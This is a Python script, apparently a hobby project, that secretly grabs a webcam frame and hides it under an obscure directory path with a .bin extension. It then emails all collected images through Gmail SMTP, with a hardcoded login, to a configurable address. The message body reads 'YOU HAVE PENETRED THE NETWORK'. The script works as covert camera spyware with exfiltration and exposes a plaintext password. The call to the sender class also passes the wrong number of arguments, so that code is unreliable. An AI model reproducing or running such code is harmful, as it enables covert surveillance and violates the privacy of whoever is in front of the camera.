
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from time import gmtime, strftime
from os import system,rename
from json import load
from random import randint,choice
import smtplib
import cv2
import argparse
try:
    import imutils
except :
    system("pip3 install imutils")
    import imutils

ap = argparse.ArgumentParser()
ap.add_argument("-m", "--mail", required=False, default="sspameur@gmail.com",help="adresse mail cible de la photo", type=str)
#ap.add_argument("-s", "--send", required=False, default=False,help="Envoi de la piece jointe", type=bool)
args = vars(ap.parse_args())


class main():
    def __init__(self):
        self.name=self.fin_name()
        print(self.name)
        self.write_name()
        self.take_picture()
        self.liste_picture= self.read_data()
        sender(self.liste_picture)

    def read_data(self):
        self.fichier=open('doc/data/data.txt','r')
        self.bob=self.fichier.read().split("\n")
        del self.bob[-1]
        return self.bob

    def write_name(self):
        self.fichier=open("doc/data/data.txt","a")
        self.fichier.write(self.name+'\n')


    def fin_name(self):
        with open("document/dico.json") as data:
            dico=load(data)
            data.close()
        return choice(dico[str(randint(4,20))]).upper()+'.tiff'

    def take_picture(self):   
        capture = cv2.VideoCapture(0)
        print(capture)
        # Vérifier que la caméra fonctionne
        if capture.isOpened():
            ret, frame = capture.read()
            cv2.imwrite('doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.name, frame)
            print("{} written!".format(self.name))  

        capture.release()# Quand tout est fait, relâchez la capture
        cv2.destroyAllWindows()
        rename('doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.name,'doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.name+'.bin')



class sender():
    def __init__(self,liste_picture:list,add:bool):
        self.liste_picture=liste_picture
        self.msg = MIMEMultipart()
        self.msg['From'] ='sspameur@gmail.com'  
        self.msg['To'] =args["mail"]  
        self.msg['Subject'] = "DATA "+strftime("%a, %d %b %Y %H:%M:%S")  ## Spécification de l'objet de votre mail
        self.msg.attach(MIMEText("YOU HAVE PENETRED THE NETWORK", 'plain'))
        self._join_()
        self.send_pic()


    def _join_(self):
        #filename = "beholder.jpg"  
        #attachment = open("beholder.jpg", "rb")
        for self.elem in self.liste_picture:
            self.part = MIMEBase('application', 'octet-stream')
            self.part.set_payload((open('doc/data/im/P-12-21-251410113914-25158114-114201514914-001/P-12-21-251410113914-25158114-114201514914-002/'+self.elem+".bin", "rb")).read())
            encoders.encode_base64(self.part)
            self.part.add_header('Content-Disposition', "attachment; filename= %s" % self.elem)
            self.msg.attach(self.part)

    def send_pic(self):
        self.server = smtplib.SMTP('smtp.gmail.com', 587)
        self.server.starttls()
        self.server.login('sspameur@gmail.com', "i_hate_ISN")
        self.server.sendmail('sspameur@gmail.com', args["mail"]  , self.msg.as_string())
        self.server.quit()
        pass




if __name__ == '__main__':
    main()
